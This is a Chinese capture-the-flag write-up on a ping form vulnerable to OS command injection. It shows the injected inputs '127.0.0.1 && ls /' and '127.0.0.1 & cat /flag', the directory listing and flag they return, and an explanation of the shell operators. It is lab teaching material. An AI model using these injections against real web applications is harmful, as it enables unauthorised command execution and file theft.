## 1

主要是讲目录这一个。
打开是一个ping界面，怀疑是SQL injection或者xss。
输入`127.0.0.1`得到
```txt
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.120 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.139 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.100 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.119/0.139 ms

```

疑惑中带有不解。差点把那个min/avg/max当目录名去了。
## 2

### 第一步
```
127.0.0.1 && ls /
```
得到响应


```

...
round-trip min/avg/max = 0.104/0.151/0.220 ms
bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
可以看到它返回了目录列表。
### 第二步

```
127.0.0.1 & cat /flag
```
得到
```
flag{ee79ce5d-c618-4380-b2d9-9443537c23aa}
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.144 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.116 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.100 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.120/0.144 ms
```

-----

## 3
不过一般来说上述payload会被视为非法请求路径或命令，并返回一个错误页面或者其他类似的响应。但也有存在安全漏洞的web应用。

- ls 显示文件和目录列表
- cat 顺序显示文本文件内容
- dir 显示文件和目录列表，但不带颜色识别

当连接到一个 Web 服务器时，浏览器将通过该服务器提供的文件来访问页面和资源。根目录会根据 Web 服务器的配置而不同。

Web 服务器通常有一个根目录（也称为文档根目录或网站根目录），它是服务器上存储网页和资源的主要目录。当浏览器请求一个页面或资源时，Web 服务器会根据请求的 URL 和配置的规则来确定从哪个位置提供文件。

例如，如果配置的根目录是 `/var/www/html`，那么当浏览器请求 `http://example.com/index.html`时，Web 服务器会在 `/var/www/html` 目录中查找 `index.html` 文件，并将其发送给浏览器作为响应。

因此，当连接到 Web 服务器时，访问的根目录将是由服务器配置决定的，它会从指定的根目录中提供文件和资源。


||作用|
|---|---|
|`&`|个控制操作符，用于在后台同时运行多个命令。它使得第一个命令在后台运行时，可以立即开始执行第二个命令。|
|`&&`|一个逻辑运算符，表示只有在前一个命令执行成功后才会继续执行后面的命令。如果第一个命令执行失败，则第二个命令不会被执行。|
|`ls /`|这个命令将列出根目录下的所有文件和目录。在 Linux 或 Unix 操作系统中，`ls`命令用于列出指定目录中的文件和子目录的名称。`/` 表示根目录，这里的命令将在根目录下执行 `ls`命令，并显示所有文件和目录的名称。
|
|`cat /flag`|显示指定文件的内容，并将其输出到终端上。这里指定文件是`flag`|